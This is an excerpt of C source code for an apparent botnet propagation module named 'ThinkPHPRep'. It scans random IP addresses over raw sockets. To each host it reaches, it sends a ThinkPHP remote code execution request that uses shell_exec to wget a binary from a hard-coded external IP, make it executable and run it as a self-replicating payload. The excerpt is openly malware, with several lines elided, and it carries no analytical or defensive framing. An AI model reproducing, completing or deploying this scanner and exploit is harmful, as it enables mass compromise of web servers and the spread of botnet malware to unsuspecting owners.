...
int thinkphp_range[] = {41,82,80,197,88,72,71,73,74, 87, 83, 84, 85,86,87,88,89,90,91,94};
...
void thinkphp_scanner(void)
{
    ...
    {
#ifdef DEBUG
        printf("[ThinkPHPRep] failed to initialize raw socket, cannot scan\n");
#endif
        exit(0);
    }
    ...
    {
#ifdef DEBUG
        printf("[ThinkPHPRep] failed to set IP_HDRINCL, cannot scan\n");
#endif
        close(thinkphp_rsck);
        exit(0);
    }
...
#ifdef DEBUG
    printf("[ThinkPHPRep] ThinkPHPRep process initialized. scanning started.\n");
#endif
        ...
        for (i = 0; i < thinkphp_SCANNER_MAX_CONNS; i++)
        {
            ...
            if (FD_ISSET(conn->fd, &fdset_wr))
            {
                ...
                if (err == 0 && ret == 0)
                {
                    ...
                    {
#ifdef DEBUG
                        printf("[ThinkPHPRep] FD%d sending payload\n", conn->fd);
#endif

                        util_strcpy(conn->payload_buf, "GET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://74.201.28.102/idk/home.x86 -O /tmp/.Fdp; chmod 777 /tmp/.Fdp; /tmp/.Fdp ThinkPHP.x86.Selfrep' HTTP/1.1\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept: /\r\nUser-Agent: Tsunami/2.0\r\n\r\n");
                    ...
                    {
#ifdef DEBUG
                        printf("[ThinkPHPRep] FD%d finnished\n", conn->fd);
#endif
...
static ipv4_t thinkphp_get_random_ip(void)
{
    ...
    do
    {
        tmp = rand_next();
		srand(time(NULL));
        int range = rand() % (sizeof(thinkphp_range)/sizeof(char *));
        o1 = thinkphp_range[range];
        o2 = (tmp >> 8) & 0xff;
        o3 = (tmp >> 16) & 0xff;
        o4 = (tmp >> 24) & 0xff;
    }
